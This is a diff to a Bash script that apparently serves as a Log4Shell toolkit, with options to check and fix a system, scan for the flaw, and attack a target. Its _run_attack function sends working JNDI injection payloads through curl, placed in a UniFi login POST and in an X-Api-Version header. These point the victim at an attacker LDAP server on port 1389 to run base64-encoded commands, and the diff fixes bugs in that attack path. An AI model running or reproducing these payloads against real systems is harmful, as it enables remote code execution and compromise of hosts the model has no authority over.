@@ -167,7 +167,7 @@ _run_attack() {
 	echo -e "\nConnection to $VIC_IP_PRT | Using uB64-HASH: ($B64S) | MODE: $X_MODE"
 	if [ "$X_MODE" == "Unifi-POST" ]; then
 		# Post api -> $VIC_IP_8443/api/login
-		curl -ksSL -X POST $VIC_IP_PRT -H "Content-Type: application/json" \
+		curl -ksSL -X POST "https://$VIC_IP_PRT/api/login" -H "Content-Type: application/json" \
 		     -d '{"username":"${jndi:ldap://'$XPL_IP':1389/Basic/Command/Base64/'$B64S'}","password":"none","remember":false,"strict":true}'
 	else
 		curl -ksSL $VIC_IP_PRT -H 'X-Api-Version: ${jndi:ldap://'$XPL_IP':1389/Basic/Command/Base64/'$B64S'}'
@@ -189,16 +189,18 @@ _get_python_scan() {
 	# https://github.com/fullhunt/log4j-scan
 	# see more for WAF bypass and listscans etc.
 
-	if [ ! -z $2 ]; then
-		_COM="-u http://127.0.0.1:80 --run-all-tests"
+	if [ -z "$1" ]; then
+		_COM="-u http://127.0.0.1:4280 --run-all-tests"
 	else
-		_COM=$2
+		_COM="$1"
 	fi
 	
 	if [ ! -d log4j-scan ]; then
 		git clone https://github.com/fullhunt/log4j-scan
 		cd log4j-scan && pip3 install -r requirements.txt
 		echo "Installation finished"
+	else
+		cd log4j-scan
 	fi
 	
 	echo -e "\nRUNNING:\n"
@@ -229,7 +231,7 @@ elif [ "$1" == "--fix-log4j" ]; then
 	_fix_lnx
 	exit 0
 elif [ "$1" == "--run-dummy-server" ]; then
-	_run_dummy_server
+	_run_dummy_server $1
 	exit 0
 elif [ "$1" == "--run-attack" ]; then
 	if [ "$4" == "--unifi-post" ]; then
@@ -244,7 +246,7 @@ elif [ "$1" == "--run-attack" ]; then
 	fi
 	exit 0
 elif [ "$1" == "--python-scan" ]; then
-	_get_python_scan $2
+	_get_python_scan "$2"
 	exit 0
 else
 	echo "Wrong input! Please enter one of these options:"
@@ -255,7 +257,7 @@ else
 	echo "			--check-system"
 	echo "			--fix-log4j"
 	echo "			--run-dummy-server <JNDIExploit.*.zip>"
-	echo "			--run-attack <FORMAT: IP:PORT> <-e/-t/'cmd'>"
+	echo "			--run-attack <FORMAT: IP:PORT> <-e/-t/'cmd'> [--unifi-post]"
 	echo "			--python-scan <command>"
 	echo
 	exit 1;
